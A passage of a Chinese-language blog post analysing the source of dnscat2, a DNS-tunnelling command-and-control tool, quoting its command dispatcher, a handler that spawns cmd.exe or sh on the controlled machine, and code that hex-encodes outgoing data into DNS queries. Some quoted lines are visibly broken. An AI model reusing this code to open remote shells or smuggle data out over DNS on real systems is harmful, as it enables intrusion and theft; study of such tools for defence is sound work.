            break;
          case COMMAND_SHELL:
            out = handle_shell(driver, in);
            break;
          case COMMAND_EXEC:
            out = handle_exec(driver, in);
            break;
          case COMMAND_DOWNLOAD:
            out = handle_download(driver, in);
            break;
          case COMMAND_UPLOAD:
            out = handle_upload(driver, in);
            break;
          case COMMAND_SHUTDOWN:
            out = handle_shutdown(driver, in);
            break;
          case COMMAND_DELAY:
            out = handle_delay(driver, in);
            break;
          case TUNNEL_CONNECT:
            out = handle_tunnel_connect(driver, in);
            break;
          case TUNNEL_DATA:
            out = handle_tunnel_data(driver, in);
            break;
          case TUNNEL_CLOSE:
            out = handle_tunnel_close(driver, in);
            break;
          case COMMAND_ERROR:
            out = handle_error(driver, in);
            break;
          default:
            LOG_ERROR("Got a command packet that we don't know how to handle!\n");
            out = command_packet_create_error_response(in->request_id, 0xFFFF, "Not implemented yet!");
        }
具体看一下handle_shell(driver,
in),就是在被控制的机器上执行cmd.exe/win,sh/linux建立shell，然后将输入输出绑定进行实时传送：
    static command_packet_t *handle_shell(driver_command_t *driver, command_packet_t *in)
    {
      session_t *session = NULL;
      if(!in->is_request)
        return NULL;
    #ifdef WIN32
      session = session_create_exec(driver->group, "cmd.exe", "cmd.exe");
    #else
      session = session_create_exec(driver->group, "sh", "sh");
    #endif
      controller_add_session(session);
      return command_packet_create_shell_response(in->request_id, session->id);
    }
###  发送数据
发送数据是接收数据的反过程，大致和接收类似，这里简单介绍一下。
前面介绍过要发送的数据产生在session将接收到的数据发送给driver之前，具体实现在polldriverfordata函数中,其中调用了drivergetoutgoing来向driver“索要数据”，然后将数据封装在outgoingbuffer中等待发送：
    static void poll_driver_for_data(session_t *session)
    {
      size_t length = -1;
      /* Read all the data we can. */
      uint8_t *data = driver_get_outgoing(session->driver, &length, -1);
      /* If a driver returns NULL, it means it's done - once the driver is
       * done and all our data is sent, go into 'shutdown' mode. */
      if(!data)
      {
        if(buffer_get_remaining_bytes(session->outgoing_buffer) == 0)
          session_kill(session);
      }
      else
      {
        if(length)
          buffer_add_bytes(session->outgoing_buffer, data, length);
        safe_free(data);
      }
    }
在drivergetoutgoing中根据不同的driver类型来产生数据。
    uint8_t *driver_get_outgoing(driver_t *driver, size_t *length, size_t max_length)
    {
      switch(driver->type)
      {
        case DRIVER_TYPE_CONSOLE:
          return driver_console_get_outgoing(driver->real_driver.console, length, max_length);
          break;
        case DRIVER_TYPE_EXEC:
          return driver_exec_get_outgoing(driver->real_driver.exec, length, max_length);
          break;
        case DRIVER_TYPE_COMMAND:
          return driver_command_get_outgoing(driver->real_driver.command, length, max_length);
          break;
        case DRIVER_TYPE_PING:
          return driver_ping_get_outgoing(driver->real_driver.ping, length, max_length);
          break;
        default:
          LOG_FATAL("UNKNOWN DRIVER TYPE! (%d in driver_get_outgoing)\n", driver->type);
          exit(1);
          break;
      }
    }
就driverconsolegetoutgoing来说，在创建driverconsole的时候就将stdin加入到了select当中进行接收标准输入作为发送数据：
    select_group_add_pipe(group, -1, stdin_handle, driver);
    select_set_recv(group,       -1, console_stdin_recv);
    select_set_closed(group,     -1, console_stdin_closed);
    static SELECT_RESPONSE_t console_stdin_recv(void *group, int socket, uint8_t *data, size_t length, char *addr, uint16_t port, void *d)
    {
      driver_console_t *driver = (driver_console_t*) d;
      buffer_add_bytes(driver->outgoing_data, data, length);
      return SELECT_OK;
    }
在之后经历sessiongetoutgoing，controllergetoutgoing，do_send后将数据发送出去。
    static void do_send(driver_dns_t *driver)
    {
      size_t        i;
      dns_t        *dns;
      buffer_t     *buffer;
      uint8_t      *encoded_bytes;
      size_t        encoded_length;
      uint8_t      *dns_bytes;
      size_t        dns_length;
      size_t        section_length;
      size_t length;
      uint8_t *data = controller_get_outgoing((size_t*)&length, (size_t)MAX_DNSCAT_LENGTH(driver->domain));
      /* If we aren't supposed to send anything (like we're waiting for a timeout),
       * data is NULL. */
      if(!data)
        return;
      assert(driver->s != -1); /* Make sure we have a valid socket. */
      assert(data); /* Make sure they aren't trying to send NULL. */
      assert(length > 0); /* Make sure they aren't trying to send 0 bytes. */
      assert(length domain));
      buffer = buffer_create(BO_BIG_ENDIAN);
      /* If no domain is set, add the wildcard prefix at the start. */
      if(!driver->domain)
      {
        buffer_add_bytes(buffer, (uint8_t*)WILDCARD_PREFIX, strlen(WILDCARD_PREFIX));
        buffer_add_int8(buffer, '.');
      }
      /* Keep track of the length of the current section (the characters between two periods). */
      section_length = 0;
      for(i = 0; i > 4) & 0x0F));
        buffer_add_int8(buffer, HEXCHAR((data[i] >> 0) & 0x0F));
        /* Add periods when we need them. */
        section_length += 2;
        if(i + 1 != length && section_length + 2 >= MAX_FIELD_LENGTH)
        {
          section_length = 0;
          buffer_add_int8(buffer, '.');
        }
      }
      /* If a domain is set, instead of the wildcard prefix, add the domain to the end. */
      if(driver->domain)
      {
        buffer_add_int8(buffer, '.');
        buffer_add_bytes(buffer, driver->domain, strlen(driver->domain));
      }
      buffer_add_int8(buffer, '\0');
      /* Get the result out. */
      encoded_bytes = buffer_create_string_and_destroy(buffer, &encoded_length);
      /* Double-check we didn't mess up the length. */
      assert(encoded_length dns_server, driver->dns_port);
      udp_send(driver->s, driver->dns_server, driver->dns_port, dns_bytes, dns_length);
      safe_free(dns_bytes);
      safe_free(encoded_bytes);
      safe_free(data);
      dns_destroy(dns);
    }
## 总结
这篇文章着重分析了dnscat2中的报文走向，以及大致的处理过程，在之后的文章中会对其中更细节的方面进行介绍。 欢迎大家评论交流！